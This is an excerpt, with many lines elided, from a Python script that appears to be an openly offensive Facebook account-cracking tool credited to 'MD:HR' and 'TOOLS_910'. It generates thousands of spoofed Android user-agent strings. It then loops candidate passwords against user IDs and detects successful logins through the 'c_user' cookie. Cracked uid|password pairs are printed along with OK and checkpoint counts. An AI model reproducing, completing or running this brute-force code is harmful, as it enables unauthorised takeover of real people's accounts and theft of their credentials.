...
for xd in range(10000):
    ...
    l=' Chrome/89.0.4389.116 Mobile MD:HR/537.36 colorOS/MiuiBrowser/12.22.0.3-gn'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

#Mozilla/5.0 (Linux; U; Android 11; fr-fr; OPPO A77s Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile MD:HR/537.36 colorOS/MiuiBrowser/12.22.0.3-gn

#Mozilla/5.0 (Linux; Android 13; OPPO A77s ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile MD:HR/537.36

    aa='Mozilla/5.0 (Linux; Android 13;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['OPPO A77s '])
    ...
    l='Chrome/107.0.0.0 Mobile MD:HR/537.36'
...
\033[1;94m       [+]        CREATED BY   :  MD:HR           \033[1;94m[+]

\033[1;94m       [+]        ON GITHUB    :  H9R10               \033[1;94m[+]

\033[1;94m       [+]        TEAM         :     TOOLS_910    \033[1;94m[+]
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m MD:HR\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\x1b[38;5;196m[MD:HR🥴] {uid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[TOOLS_910👑] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
